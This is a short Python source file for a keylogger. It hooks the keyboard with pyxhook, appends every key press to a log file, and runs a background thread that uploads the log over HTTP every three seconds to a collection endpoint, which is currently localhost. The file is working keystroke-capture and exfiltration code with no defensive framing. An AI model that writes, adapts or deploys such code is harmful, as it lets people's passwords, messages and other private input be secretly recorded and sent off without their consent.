#!/usr/bin/env python
import os
import pyxhook
import threading
import requests
from time import sleep

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get(
    'pylogger_file',
    os.path.abspath('./keys.log')
    # os.path.expanduser('~/Desktop/file.log')
)

# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        # File does not exist, or no permissions.
        pass


def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

    if event.Ascii == cancel_key:
        new_hook.cancel()

def test():
    while True:
        try:
            requests.post("http://localhost:5000/api/recive", files={'file': open(log_file)})
            sleep(3)
        except Exception as e:
            print(e)
            sleep(3)

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()

def keyboard():
    try:
        new_hook.start()
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

if __name__ == "__main__":
    open(log_file, 'a')
    thread1 = threading.Thread(target=keyboard)
    thread2 = threading.Thread(target=test)

    thread1.start()
    thread2.start()

